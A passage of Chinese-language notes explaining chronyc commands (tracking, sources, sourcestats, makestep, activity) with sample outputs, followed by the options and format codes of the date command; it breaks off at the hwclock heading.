\u7aef\u53e3\u53f7\u3002\u8fd9\u9ed8\u8ba4\u4e3a323\uff1b\u5f88\u5c11\u9700\u8981\u6539\u53d8\u8fd9\u4e00\u70b9\u3002 -f \u6587\u4ef6 \u6b64\u9009\u9879\u5c06\u88ab\u5ffd\u7565\uff0c\u4ec5\u4e3a\u517c\u5bb9\u6027\u800c\u63d0\u4f9b\u3002 -a \u6b64\u9009\u9879\u5c06\u88ab\u5ffd\u7565\uff0c\u4ec5\u4e3a\u517c\u5bb9\u6027\u800c\u63d0\u4f9b\u3002 -v\uff0c --\u7248\u672c \u4f7f\u7528\u6b64\u9009\u9879\uff0cchronyc\u5728\u7ec8\u7aef\u4e0a\u663e\u793a\u5176\u7248\u672c\u53f7\u5e76\u9000\u51fa\u3002 --\u5e2e\u52a9 \u4f7f\u7528\u6b64\u9009\u9879\uff0cchronyc \u4f1a\u5728\u7ec8\u7aef\u4e0a\u663e\u793a\u4e00\u6761\u5e2e\u52a9\u6d88\u606f\u5e76\u9000\u51fa\u3002 \u66f4\u591a\u7ec6\u8282\u67e5\u770b\uff1ahttps://chrony.tuxfamily.org/doc/4.3/chronyd.html chronyc\u652f\u6301\u7684\u6307\u4ee4 tracking # chronyc tracking Reference ID : CB00710F (foo.example.net) Stratum : 3 Ref time (UTC) : Fri Jan 27 09:49:17 2017 System time : 0.000006523 seconds slow of NTP time Last offset : -0.000006747 seconds RMS offset : 0.000035822 seconds Frequency : 3.225 ppm slow Residual freq : -0.000 ppm Skew : 0.129 ppm Root delay : 0.013639022 seconds Root dispersion : 0.001100737 seconds Update interval : 64.2 seconds Leap status : Normal tracking\u7ed3\u679c\u89e3\u91ca Reference ID \u8fd9\u662f\u8ba1\u7b97\u673a\u5f53\u524d\u540c\u6b65\u5230\u7684\u670d\u52a1\u5668\u7684\u5f15\u7528 ID \u6216\u8005\u540d\u79f0\uff08\u6216 IP \u5730\u5740\uff0c\u57df\u540d\uff09\uff0c\u5982\u679c\u5f15\u7528 ID \u4e3a 7F7F0101 \u5e76\u4e14\u6ca1\u6709\u540d\u79f0\u6216 IP \u5730\u5740\uff0c\u5219\u8868\u793a\u8ba1\u7b97\u673a\u672a\u540c\u6b65\u5230\u4efb\u4f55\u5916\u90e8\u6e90 Stratum \u8be5\u5c42\u8868\u793a\u6211\u4eec\u8ddd\u79bb\u8fde\u63a5\u4e86\u53c2\u8003\u65f6\u949f\u7684\u8ba1\u7b97\u673a\u6709\u591a\u5c11\u8dc3\u70b9\uff0c\u672c\u673a\u7b97\u4e00\u4e2a\u70b9\u3002 Ref time \u8fd9\u662f\u5904\u7406\u6765\u81ea\u53c2\u8003\u6e90\u7684\u6700\u540e\u4e00\u6b21\u6d4b\u91cf\u7684\u65f6\u95f4 \uff08UTC\uff09\u3002 System time \u8fd9\u662f NTP \u65f6\u949f\u548c\u7cfb\u7edf\u65f6\u949f\u4e4b\u95f4\u7684\u504f\u79fb\u3002NTP \u670d\u52a1\u5668\u4e3a NTP \u5ba2\u6237\u7aef\u63d0\u4f9b\u65f6\u95f4\u3002\u7cfb\u7edf\u65f6\u949f\u4e0e NTP \u65f6\u949f\u540c\u6b65\u3002\u4e3a\u4e86\u907f\u514d\u7cfb\u7edf\u65f6\u95f4\u4e2d\u7684\u6b65\u9aa4\uff08\u8fd9\u53ef\u80fd\u4f1a\u5bf9\u67d0\u4e9b\u5e94\u7528\u7a0b\u5e8f\u4ea7\u751f\u8d1f\u9762\u5f71\u54cd\uff09\uff0c\u901a\u5e38\u53ea\u80fd\u901a\u8fc7\u52a0\u901f\u6216\u51cf\u6162\u6765\u6821\u6b63\u7cfb\u7edf\u65f6\u949f\u3002\u5982\u679c\u504f\u79fb\u91cf\u592a\u5927\uff0c\u6b64\u6821\u6b63\u5c06\u82b1\u8d39\u5f88\u957f\u65f6\u95f4\u3002\u53ef\u4ee5\u901a\u8fc7 maketep \u547d\u4ee4\u6216\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684 maketep \u6307\u4ee4\u5f3a\u5236\u6267\u884c\u6b65\u9aa4\u3002 \u8bf7\u6ce8\u610f\uff0c chronyc \u62a5\u544a\u7684\u6240\u6709\u5176\u4ed6\u504f\u79fb\u91cf\u548c\u65e5\u5fd7\u6587\u4ef6\u4e2d\u7684\u5927\u591a\u6570\u504f\u79fb\u91cf\u90fd\u662f\u76f8\u5bf9\u4e8e NTP \u65f6\u949f\u7684\uff0c\u800c\u4e0d\u662f\u76f8\u5bf9\u4e8e\u7cfb\u7edf\u65f6\u949f\u7684\u3002 Last offset \u8fd9\u662f\u4e0a\u6b21\u65f6\u949f\u66f4\u65b0\u65f6\u4f30\u8ba1\u7684\u672c\u5730\u504f\u79fb\u91cf\u3002\u6b63\u503c\u8868\u793a\u672c\u5730\u65f6\u95f4\uff08\u5982\u524d\u6240\u8ff0\u4f30\u8ba1\u7684\u771f\u5b9e\u65f6\u95f4\uff09\u65e9\u4e8e\u65f6\u95f4\u6e90\u3002 RMS offset \u8fd9\u662f\u504f\u79fb\u503c\u7684\u957f\u671f\u5e73\u5747\u503c\u3002 Frequency \u201c\u9891\u7387\u201d\u662f\u7cfb\u7edf\u65f6\u949f\u51fa\u9519\u7684\u901f\u7387\uff0c\u5982\u679c chronyd \u6ca1\u6709\u7ea0\u6b63\u5b83\u3002\u5b83\u4ee5 ppm\uff08\u767e\u4e07\u5206\u4e4b\u51e0\uff09\u8868\u793a\u3002\u4f8b\u5982\uff0c1 ppm \u7684\u503c\u610f\u5473\u7740\u5f53\u7cfb\u7edf\u65f6\u949f\u8ba4\u4e3a\u5b83\u5df2\u7ecf\u524d\u8fdb\u4e86 1 \u79d2\u65f6\uff0c\u5b83\u5b9e\u9645\u4e0a\u76f8\u5bf9\u4e8e\u771f\u5b9e\u65f6\u95f4\u524d\u8fdb\u4e86 1.000001 \u79d2\u3002 Residual freq \u8fd9\u663e\u793a\u4e86\u5f53\u524d\u6240\u9009\u53c2\u8003\u6e90\u7684\u201c\u6b8b\u4f59\u9891\u7387\u201d\u3002\u8fd9\u53cd\u6620\u4e86\u53c2\u8003\u6e90\u7684\u6d4b\u91cf\u503c\u6307\u793a\u7684\u9891\u7387\u4e0e\u5f53\u524d\u4f7f\u7528\u7684\u9891\u7387\u4e4b\u95f4\u7684\u4efb\u4f55\u5dee\u5f02\u3002 Skew \u8fd9\u662f\u9891\u7387\u4e0a\u7ed1\u5b9a\u7684\u4f30\u8ba1\u8bef\u5dee\u3002 Root delay \u8fd9\u662f\u4ece\u4e0a\u4e00\u8df3\u5230\u6b64\u8ba1\u7b97\u673a\u7684\u7f51\u7edc\u8def\u5f84\u5ef6\u8fdf Root dispersion \u8fd9\u662f\u7f51\u7edc\u8def\u5f84\u5ef6\u8fdf\u7684\u603b\u548c\u3002 Update interval \u8fd9\u662f\u6700\u8fd1\u4e24\u6b21\u65f6\u949f\u66f4\u65b0\u4e4b\u95f4\u7684\u95f4\u9694\u3002 \u771f\u6b63\u5bf9\u7cfb\u7edf\u65f6\u95f4\u66f4\u6539\u7684\u4e24\u6b21\u95f4\u9694\uff0c\u6bcf\u6b21\u65f6\u95f4\u66f4\u6539\uff0c\u53ef\u4ee5\u901a\u8fc7\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u6dfb\u52a0log tracking \u9009\u9879\uff0c\u53ef\u4ee5\u628a\u6bcf\u6b21\u65f6\u95f4\u66f4\u6539\u7684\u8bb0\u5f55\u5199\u5230tracking.log\u53bb Leap status \u8fd9\u662f\u8df3\u8dc3\u72b6\u6001\uff0c\u53ef\u4ee5\u662f \u6b63\u5e38 Normal \u3001 \u63d2\u5165\u7b2c\u4e8c Insert second\u3001 \u5220\u9664\u79d2 Delete second \u6216 \u672a\u540c\u6b65 Not synchronised\u3002 sources [ -a ] [ -v ] \u529f\u80fd \u6b64\u547d\u4ee4\u663e\u793a\u6709\u5173 chronyd \u6b63\u5728\u8bbf\u95ee\u7684\u5f53\u524d\u65f6\u95f4\u6e90\u7684\u4fe1\u606f\u3002 \u5982\u679c\u6307\u5b9a\u4e86 -a \u9009\u9879\uff0c\u5219\u663e\u793a\u6240\u6709\u6e90\uff0c\u5305\u62ec\u5c1a\u65e0\u5df2\u77e5\u5730\u5740\u7684\u6e90\u3002\u6b64\u7c7b\u6e90\u5177\u6709 ID#XXXXXXXXXX \u683c\u5f0f\u7684\u6807\u8bc6\u7b26\uff0c\u53ef\u7528\u4e8e\u9700\u8981\u6e90\u5730\u5740\u7684\u5176\u4ed6\u547d\u4ee4\u3002 -v \u9009\u9879\u542f\u7528\u8be6\u7ec6\u8f93\u51fa\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5c06\u663e\u793a\u989d\u5916\u7684\u6807\u9898\u884c\u4f5c\u4e3a\u5217\u542b\u4e49\u7684\u63d0\u9192\u3002 # chronyc sources -a MS Name/IP address Stratum Poll Reach LastRx Last sample =============================================================================== #* GPS0 0 4 377 11 -479ns[ -621ns] +/- 134ns ^? foo.example.net 2 6 377 23 -923us[ -924us] +/- 43ms ^+ bar.example.net 1 6 377 21 -2629us[-2619us] +/- 86ms sources\u547d\u4ee4\u89e3\u91ca M \u8fd9\u8868\u793a\u6e90\u7684\u6a21\u5f0f\u3002 ^ \u8868\u793a\u670d\u52a1\u5668\uff0c = \u8868\u793a\u5bf9\u7b49\u65b9\uff0c # \u8868\u793a\u672c\u5730\u8fde\u63a5\u7684\u53c2\u8003\u65f6\u949f\u3002 S \u6b64\u5217\u6307\u793a\u6e90\u7684\u9009\u62e9\u72b6\u6001\u3002 ***\u8868\u793a\u5f53\u524d\u9009\u62e9\u8fdb\u884c\u540c\u6b65\u7684\u6700\u4f73\u6e90\u3002 + \u8868\u793a\u9009\u62e9\u8fdb\u884c\u540c\u6b65\u7684\u5176\u4ed6\u6e90\uff0c\u8fd9\u4e9b\u6e90\u4e0e\u6700\u4f73\u6e90\u76f8\u7ed3\u5408\u3002 - \u8868\u793a\u88ab\u89c6\u4e3a\u53ef\u9009\u62e9\u8fdb\u884c\u540c\u6b65\u4f46\u5f53\u524d\u672a\u9009\u62e9\u7684\u6e90\u3002 x \u8868\u793a chronyd \u8ba4\u4e3a\u662f\u865a\u5047\u6807\u8bb0\u7684\u6765\u6e90\uff08\u5373\u5176\u65f6\u95f4\u4e0e\u5927\u591a\u6570\u5176\u4ed6\u6765\u6e90\u6216\u4f7f\u7528 \u4fe1\u4efb \u9009\u9879\u6307\u5b9a\u7684\u6765\u6e90\u4e0d\u4e00\u81f4\uff09\u3002 ~ \u8868\u793a\u5176\u65f6\u95f4\u4f3c\u4e4e\u5177\u6709\u592a\u5927\u53ef\u53d8\u6027\u7684\u6765\u6e90\u3002 \uff1f \u8868\u793a\u7531\u4e8e\u5176\u4ed6\u539f\u56e0\uff08\u4f8b\u5982\uff0c\u65e0\u6cd5\u8bbf\u95ee\u3001\u672a\u540c\u6b65\u6216\u6ca1\u6709\u8db3\u591f\u7684\u6d4b\u91cf\u503c\uff09\u800c\u88ab\u8ba4\u4e3a\u65e0\u6cd5\u9009\u62e9\u540c\u6b65\u7684\u6e90\u3002 Name/IP address \u8fd9\u5c06\u663e\u793a\u6e90\u7684\u540d\u79f0\u6216 IP \u5730\u5740\uff0c\u6216\u53c2\u8003\u65f6\u949f\u7684\u5f15\u7528 ID\u3002 Stratum \u8fd9\u663e\u793a\u4e86\u6765\u6e90\u5c42\uff0c\u5982\u6700\u8fd1\u6536\u5230\u7684\u6837\u672c\u4e2d\u6240\u62a5\u544a\u7684\u90a3\u6837\u3002\u7b2c 1 \u5c42\u8868\u793a\u5177\u6709\u672c\u5730\u8fde\u63a5\u7684\u53c2\u8003\u65f6\u949f\u7684\u8ba1\u7b97\u673a\u3002\u4e0e\u7b2c 1 \u5c42\u8ba1\u7b97\u673a\u540c\u6b65\u7684\u8ba1\u7b97\u673a\u4f4d\u4e8e\u7b2c 2 \u5c42\u3002\u4e0e\u7b2c 2 \u5c42\u8ba1\u7b97\u673a\u540c\u6b65\u7684\u8ba1\u7b97\u673a\u4f4d\u4e8e\u7b2c 3 \u5c42\uff0c\u4f9d\u6b64\u7c7b\u63a8\u3002 Poll \u8fd9\u5c06\u663e\u793a\u8f6e\u8be2\u6e90\u7684\u901f\u7387\uff0c\u4ee5\u95f4\u9694\u7684 2 \u4e3a\u5e95\u6570\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\u3002\u56e0\u6b64\uff0c\u503c\u4e3a 6 \u8868\u793a\u6bcf 64 \u79d2\u8fdb\u884c\u4e00\u6b21\u6d4b\u91cf\u3002 chronyd \u4f1a\u6839\u636e\u5f53\u524d\u6761\u4ef6\u81ea\u52a8\u6539\u53d8\u8f6e\u8be2\u7387\u3002 Reach \u8fd9\u663e\u793a\u4e86\u6253\u5370\u4e3a\u516b\u8fdb\u5236\u6570\u7684\u6e90\u7684\u53ef\u8bbf\u95ee\u6027\u5bc4\u5b58\u5668\u3002\u5bc4\u5b58\u5668\u67098\u4f4d\uff0c\u5e76\u5728\u4ece\u6e90\u63a5\u6536\u6216\u4e22\u5931\u7684\u6bcf\u4e2a\u6570\u636e\u5305\u4e0a\u66f4\u65b0\u3002\u503c\u4e3a 377 \u8868\u793a\u5df2\u6536\u5230\u6700\u8fd1\u516b\u6b21\u4f20\u8f93\u4e2d\u6240\u6709\u4f20\u8f93\u7684\u6709\u6548\u56de\u590d\u3002 LastRx \u6b64\u5217\u663e\u793a\u4ece\u6e90\u63a5\u6536\u5230\u6700\u540e\u4e00\u4e2a\u826f\u597d\u6837\u672c\uff08\u663e\u793a\u5728\u4e0b\u4e00\u5217\u4e2d\uff09\u7684\u65f6\u95f4\u3002\u67d0\u4e9b\u6d4b\u8bd5\u5931\u8d25\u7684\u6d4b\u91cf\u503c\u5c06\u88ab\u5ffd\u7565\u3002\u8fd9\u901a\u5e38\u4ee5\u79d2\u4e3a\u5355\u4f4d\u3002\u5b57\u6bcd m \u3001 h \u3001 d \u6216 y \u8868\u793a\u5206\u949f\u3001\u5c0f\u65f6\u3001\u5929\u6216\u5e74\u3002 Last sample \u6b64\u5217\u663e\u793a\u4e0a\u6b21\u6d4b\u91cf\u65f6\u672c\u5730\u65f6\u949f\u4e0e\u6e90\u4e4b\u95f4\u7684\u504f\u79fb\u3002\u65b9\u62ec\u53f7\u4e2d\u7684\u6570\u5b57\u8868\u793a\u5b9e\u9645\u6d4b\u91cf\u7684\u504f\u79fb\u91cf\u3002\u8fd9\u53ef\u4ee5\u7531 ns \uff08\u8868\u793a\u7eb3\u79d2\uff09\u3001 us \uff08\u8868\u793a\u5fae\u79d2\uff09\u3001 \u6beb\u79d2 \uff08\u8868\u793a\u6beb\u79d2\uff09\u6216 s \uff08\u8868\u793a\u79d2\uff09\u540e\u7f00\u3002\u65b9\u62ec\u53f7\u5de6\u4fa7\u7684\u6570\u5b57\u663e\u793a\u4e86\u539f\u59cb\u6d4b\u91cf\u503c\uff0c\u7ecf\u8fc7\u8c03\u6574\u4ee5\u5141\u8bb8\u81ea\u90a3\u65f6\u4ee5\u6765\u5e94\u7528\u4e8e\u672c\u5730\u65f6\u949f\u7684\u4efb\u4f55\u538b\u6446\u7387\u3002 +/- \u6307\u6807\u540e\u9762\u7684\u6570\u5b57\u663e\u793a\u6d4b\u91cf\u4e2d\u7684\u8fb9\u9645\u8bef\u5dee\u3002\u6b63\u504f\u79fb\u8868\u793a\u672c\u5730\u65f6\u949f\u65e9\u4e8e\u6e90\u65f6\u949f\u3002 sourcestats [ -a ] [ -v ] \u529f\u80fd sourcestats \u547d\u4ee4\u663e\u793a\u6709\u5173 chronyd \u5f53\u524d\u6b63\u5728\u68c0\u67e5\u7684\u6bcf\u4e2a\u6e90\u7684\u6f02\u79fb\u7387\u548c\u504f\u79fb\u4f30\u8ba1\u8fc7\u7a0b\u7684\u4fe1\u606f\u3002 \u5982\u679c\u6307\u5b9a\u4e86 -a \u9009\u9879\uff0c\u5219\u663e\u793a\u6240\u6709\u6e90\uff0c\u5305\u62ec\u5c1a\u65e0\u5df2\u77e5\u5730\u5740\u7684\u6e90\u3002\u6b64\u7c7b\u6e90\u5177\u6709 ID#XXXXXXXXXX \u683c\u5f0f\u7684\u6807\u8bc6\u7b26\uff0c\u53ef\u7528\u4e8e\u9700\u8981\u6e90\u5730\u5740\u7684\u5176\u4ed6\u547d\u4ee4\u3002 -v \u9009\u9879\u542f\u7528\u8be6\u7ec6\u8f93\u51fa\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5c06\u663e\u793a\u989d\u5916\u7684\u6807\u9898\u884c\u4f5c\u4e3a\u5217\u542b\u4e49\u7684\u63d0\u9192\u3002 # chronyc sourcestats -a Name/IP Address NP NR Span Frequency Freq Skew Offset Std Dev =============================================================================== foo.example.net 11 5 46m -0.001 0.045 1us 25us Name/IP Address \u8fd9\u662f NTP \u670d\u52a1\u5668\u7684\u540d\u79f0\u6216 IP \u5730\u5740\uff0c\u6216\u53c2\u8003\u65f6\u949f\u7684\u5f15\u7528 ID\u3002 NP \u8fd9\u662f\u5f53\u524d\u4e3a\u670d\u52a1\u5668\u4fdd\u7559\u7684\u91c7\u6837\u70b9\u6570\u3002 NR \u8fd9\u662f\u5728\u6700\u540e\u4e00\u6b21\u56de\u5f52\u540e\u5177\u6709\u76f8\u540c\u7b26\u53f7\u7684\u6b8b\u5dee\u8fd0\u884c\u6b21\u6570\u3002\u5982\u679c\u6b64\u6570\u5b57\u76f8\u5bf9\u4e8e\u6837\u672c\u6570\u5f00\u59cb\u53d8\u5f97\u592a\u5c0f\uff0c\u5219\u8868\u660e\u76f4\u7ebf\u4e0d\u518d\u9002\u5408\u6570\u636e\u3002\u5982\u679c\u8fd0\u884c\u6b21\u6570\u592a\u5c11\uff0c chronyd \u5c06\u4e22\u5f03\u8f83\u65e7\u7684\u6837\u672c\u5e76\u91cd\u65b0\u8fd0\u884c\u56de\u5f52\uff0c\u76f4\u5230\u8fd0\u884c\u6b21\u6570\u53d8\u5f97\u53ef\u63a5\u53d7\u3002 Span \u8fd9\u662f\u6700\u65e7\u548c\u6700\u65b0\u6837\u672c\u4e4b\u95f4\u7684\u95f4\u9694\u3002\u5982\u679c\u672a\u663e\u793a\u5355\u4f4d\uff0c\u5219\u8be5\u503c\u4ee5\u79d2\u4e3a\u5355\u4f4d\u3002\u5728\u6b64\u793a\u4f8b\u4e2d\uff0c\u95f4\u9694\u4e3a 46 \u5206\u949f\u3002 Frequency \u8fd9\u662f\u670d\u52a1\u5668\u7684\u4f30\u8ba1\u6b8b\u4f59\u9891\u7387\uff0c\u4ee5\u767e\u4e07\u5206\u4e4b\u4e00\u4e3a\u5355\u4f4d\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u8ba1\u7b97\u673a\u7684\u65f6\u949f\u76f8\u5bf9\u4e8e\u670d\u52a1\u5668\u4f30\u8ba1\u8fd0\u884c\u901f\u5ea6\u6162 10^9 \u4e2d\u7684 1 \u90e8\u5206\u3002 Freq Skew \u8fd9\u662f Freq \u4e0a\u7684\u4f30\u8ba1\u8bef\u5dee\u8fb9\u754c\uff08\u540c\u6837\u4ee5\u767e\u4e07\u5206\u4e4b\u4e00\u4e3a\u5355\u4f4d\uff09\u3002 Offset \u8fd9\u662f\u6e90\u7684\u4f30\u8ba1\u504f\u79fb\u91cf\u3002 Std Dev \u8fd9\u662f\u4f30\u8ba1\u7684\u6837\u672c\u6807\u51c6\u5dee\u3002 maketep \u7acb\u5373\u540c\u6b65(\u9700\u8981\u5728chrony\u8f83\u9ad8\u7684\u7248\u672c\u4e2d\u624d\u884c) #chronyc makestep 200 OK activity \u529f\u80fd \u6b64\u547d\u4ee4\u62a5\u544a\u8054\u673a\u7684\u6570\u91cf\u3002 # chronyc activity 200 OK 1 sources online 0 sources offline 0 sources doing burst (return to online) 0 sources doing burst (return to offline) 0 sources with unknown address activity\u7ed3\u679c\u89e3\u91ca online \u670d\u52a1\u5668\u6216\u5bf9\u7b49\u65b9\u5f53\u524d\u5904\u4e8e\u8054\u673a\u72b6\u6001\uff08\u5373\u7531 chronyd \u5047\u5b9a\u4e3a\u53ef\u8bbf\u95ee\uff09 offline \u670d\u52a1\u5668\u6216\u5bf9\u7b49\u4f53\u5f53\u524d\u5904\u4e8e\u8131\u673a\u72b6\u6001\uff08\u5373\u7531 chronyd \u5047\u5b9a\u4e3a\u65e0\u6cd5\u8bbf\u95ee\uff09 burst_online \u5df2\u4e3a\u670d\u52a1\u5668\u542f\u52a8\u7a81\u53d1\u547d\u4ee4\uff0c\u5e76\u4e14\u6b63\u5728\u6267\u884c\u8be5\u547d\u4ee4;\u7a81\u53d1\u5b8c\u6210\u540e\uff0c\u670d\u52a1\u5668\u6216\u5bf9\u7b49\u65b9\u5c06\u8fd4\u56de\u5230\u8054\u673a\u72b6\u6001\u3002 burst_offline \u5df2\u4e3a\u670d\u52a1\u5668\u542f\u52a8\u7a81\u53d1\u547d\u4ee4\uff0c\u5e76\u4e14\u6b63\u5728\u6267\u884c\u8be5\u547d\u4ee4;\u7a81\u53d1\u5b8c\u6210\u540e\uff0c\u670d\u52a1\u5668\u6216\u5bf9\u7b49\u65b9\u5c06\u8fd4\u56de\u5230\u8131\u673a\u72b6\u6001\u3002 unresolved \u670d\u52a1\u5668\u6216\u5bf9\u7b49\u65b9\u7684\u540d\u79f0\u5c1a\u672a\u89e3\u6790\u4e3a\u5730\u5740;\u6b64\u6765\u6e90\u5728 \u6765\u6e90 \u548c \u6765\u6e90\u7edf\u8ba1 \u62a5\u544a\u4e2d\u4e0d\u53ef\u89c1\u3002 \u66f4\u591a\u7ec6\u8282\u67e5\u770b\uff1ahttps://chrony.tuxfamily.org/doc/4.3/chronyc.html \u5176\u4ed6\u77e5\u8bc6 date\u547d\u4ee4 \u6253\u5370\u6216\u8bbe\u7f6e\u7cfb\u7edf\u65e5\u671f\u548c\u65f6\u95f4 \u8bed\u6cd5 date [\u9009\u9879]... [+\u683c\u5f0f] date [\u9009\u9879] [MMDDhhmm[[CC]YY][.ss]] \u529f\u80fd \u6839\u636e\u6307\u5b9a\u683c\u5f0f\u663e\u793a\u5f53\u524d\u65f6\u95f4\u6216\u8bbe\u7f6e\u7cfb\u7edf\u65f6\u95f4. -d, --date=STRING \u663e\u793a\u7531 STRING \u6307\u5b9a\u7684\u65f6\u95f4, \u800c\u4e0d\u662f\u5f53\u524d\u65f6\u95f4 -f, --file=DATEFILE \u663e\u793a DATEFILE \u4e2d\u6bcf\u4e00\u884c\u6307\u5b9a\u7684\u65f6\u95f4, \u5982\u540c\u5c06 DATEFILE \u4e2d\u7684\u6bcf\u884c\u4f5c\u4e3a --date \u7684\u53c2\u6570\u4e00\u6837 -I, --iso-8601[=TIMESPEC] \u6309\u7167 ISO-8601 \u7684\u65e5\u671f/\u65f6\u95f4\u683c\u5f0f\u8f93\u51fa\u65f6\u95f4. TIMESPEC= date (\u6216\u8005\u4e0d\u6307\u5b9a\u65f6)\u4ec5\u8f93\u51fa\u65e5\u671f,\u7b49\u4e8e hours , minutes , seconds \u65f6\u6309\u7167\u6307\u5b9a\u7cbe\u5ea6\u8f93\u51fa\u65e5\u671f\u53ca\u65f6\u95f4\u3002 -r, --reference=FILE \u663e\u793a FILE \u7684\u6700\u540e\u4fee\u6539\u65f6\u95f4 -R, --rfc-822 \u6839\u636e RFC-822 \u6307\u5b9a\u683c\u5f0f\u8f93\u51fa\u65e5\u671f -s, --set=STRING \u6839\u636e STRING \u8bbe\u7f6e\u65f6\u95f4 -u, --utc, --universal \u663e\u793a\u6216\u8bbe\u7f6e\u5168\u7403\u65f6\u95f4(\u683c\u6797\u5a01\u6cbb\u65f6\u95f4) --help \u663e\u793a\u672c\u5e2e\u52a9\u6587\u4ef6\u5e76\u9000\u51fa --version \u663e\u793a\u7248\u672c\u4fe1\u606f\u5e76\u9000\u51fa \u683c\u5f0f FORMAT \u63a7\u5236\u7740\u8f93\u51fa\u683c\u5f0f. \u4ec5\u5f53\u9009\u9879\u6307\u5b9a\u4e3a\u5168\u7403\u65f6\u95f4\u65f6\u672c\u683c\u5f0f\u624d\u6709\u6548\u3002 \u5206\u522b\u89e3\u91ca\u5982\u4e0b: %% \u6587\u672c\u7684 % %a \u5f53\u524d\u533a\u57df\u7684\u661f\u671f\u51e0\u7684\u7b80\u5199 (Sun..Sat) %A \u5f53\u524d\u533a\u57df\u7684\u661f\u671f\u51e0\u7684\u5168\u79f0 (\u4e0d\u540c\u957f\u5ea6) (Sunday..Saturday) %b \u5f53\u524d\u533a\u57df\u7684\u6708\u4efd\u7684\u7b80\u5199 (Jan..Dec) %B \u5f53\u524d\u533a\u57df\u7684\u6708\u4efd\u7684\u5168\u79f0(\u53d8\u957f) (January..December) %c \u5f53\u524d\u533a\u57df\u7684\u65e5\u671f\u548c\u65f6\u95f4 (Sat Nov 04 12:02:33 EST 1989) %d (\u6708\u4efd\u4e2d\u7684)\u51e0\u53f7(\u7528\u4e24\u4f4d\u8868\u793a) (01..31) %D \u65e5\u671f(\u6309\u7167 \u6708/\u65e5\u671f/\u5e74 \u683c\u5f0f\u663e\u793a) (mm/dd/yy) %e (\u6708\u4efd\u4e2d\u7684)\u51e0\u53f7(\u53bb\u96f6\u8868\u793a) ( 1..31) %h \u540c %b %H \u5c0f\u65f6(\u6309 24 \u5c0f\u65f6\u5236\u663e\u793a\uff0c\u7528\u4e24\u4f4d\u8868\u793a) (00..23) %I \u5c0f\u65f6(\u6309 12 \u5c0f\u65f6\u5236\u663e\u793a\uff0c\u7528\u4e24\u4f4d\u8868\u793a) (01..12) %j (\u4e00\u5e74\u4e2d\u7684)\u7b2c\u51e0\u5929(\u7528\u4e09\u4f4d\u8868\u793a) (001..366) %k \u5c0f\u65f6(\u6309 24 \u5c0f\u65f6\u5236\u663e\u793a\uff0c\u53bb\u96f6\u663e\u793a) ( 0..23) %l \u5c0f\u65f6(\u6309 12 \u5c0f\u65f6\u5236\u663e\u793a\uff0c\u53bb\u96f6\u8868\u793a) ( 1..12) %m \u6708\u4efd(\u7528\u4e24\u4f4d\u8868\u793a) (01..12) %M \u5206\u949f\u6570(\u7528\u4e24\u4f4d\u8868\u793a) (00..59) %n \u6362\u884c %p \u5f53\u524d\u65f6\u95f4\u662f\u4e0a\u5348 AM \u8fd8\u662f\u4e0b\u5348 PM %r \u65f6\u95f4,\u6309 12 \u5c0f\u65f6\u5236\u663e\u793a (hh:mm:ss [A/P]M) %s \u4ece 1970\u5e741\u67081\u65e50\u70b90\u52060\u79d2\u5230\u73b0\u5728\u5386\u7ecf\u7684\u79d2\u6570 (GNU\u6269\u5145) %S \u79d2\u6570(\u7528\u4e24\u4f4d\u8868\u793a)(00..60) %t \u6c34\u5e73\u65b9\u5411\u7684 tab \u5236\u8868\u7b26 %T \u65f6\u95f4,\u6309 24 \u5c0f\u65f6\u5236\u663e\u793a(hh:mm:ss) %U (\u4e00\u5e74\u4e2d\u7684)\u7b2c\u51e0\u4e2a\u661f\u671f\uff0c\u4ee5\u661f\u671f\u5929\u4f5c\u4e3a\u4e00\u5468\u7684\u5f00\u59cb(\u7528\u4e24\u4f4d\u8868\u793a) (00..53) %V (\u4e00\u5e74\u4e2d\u7684)\u7b2c\u51e0\u4e2a\u661f\u671f\uff0c\u4ee5\u661f\u671f\u4e00\u4f5c\u4e3a\u4e00\u5468\u7684\u5f00\u59cb(\u7528\u4e24\u4f4d\u8868\u793a) (01..52) %w \u7528\u6570\u5b57\u8868\u793a\u661f\u671f\u51e0 (0..6); 0 \u4ee3\u8868\u661f\u671f\u5929 %W (\u4e00\u5e74\u4e2d\u7684)\u7b2c\u51e0\u4e2a\u661f\u671f\uff0c\u4ee5\u661f\u671f\u4e00\u4f5c\u4e3a\u4e00\u5468\u7684\u5f00\u59cb(\u7528\u4e24\u4f4d\u8868\u793a) (00..53) %x \u6309\u7167 (mm/dd/yy) \u683c\u5f0f\u663e\u793a\u5f53\u524d\u65e5\u671f %X \u6309\u7167 (%H:%M:%S) \u683c\u5f0f\u663e\u793a\u5f53\u524d\u65f6\u95f4 %y \u5e74\u7684\u540e\u4e24\u4f4d\u6570\u5b57 (00..99) %Y \u5e74(\u7528 4 \u4f4d\u8868\u793a) (1970...) %z \u6309\u7167 RFC-822 \u4e2d\u6307\u5b9a\u7684\u6570\u5b57\u65f6\u533a\u663e\u793a(\u5982, -0500) (\u4e3a\u975e\u6807\u51c6\u6269\u5145) %Z \u65f6\u533a(\u4f8b\u5982, EDT (\u7f8e\u56fd\u4e1c\u90e8\u65f6\u533a)), \u5982\u679c\u4e0d\u80fd\u51b3\u5b9a\u662f\u54ea\u4e2a\u65f6\u533a\u5219\u4e3a\u7a7a \u9ed8\u8ba4\u60c5\u51b5\u4e0b,\u7528 0 \u586b\u5145\u6570\u636e\u7684\u7a7a\u7f3a\u90e8\u5206. GNU \u7684 date \u547d\u4ee4\u80fd\u5206\u8fa8\u5728 `%'\u548c\u6570\u5b57\u6307\u793a\u4e4b\u95f4\u7684\u4ee5\u4e0b\u4fee\u6539. - (\u8fde\u63a5\u53f7) \u4e0d\u8fdb\u884c\u586b\u5145 _ (\u4e0b\u5212\u7ebf) \u7528\u7a7a\u683c\u8fdb\u884c\u586b\u5145 hwclock\u547d\u4ee4 \u8bed\u6cd5 hwclock [\u529f\u80fd] [\u9009\u9879...] \u529f\u80fd 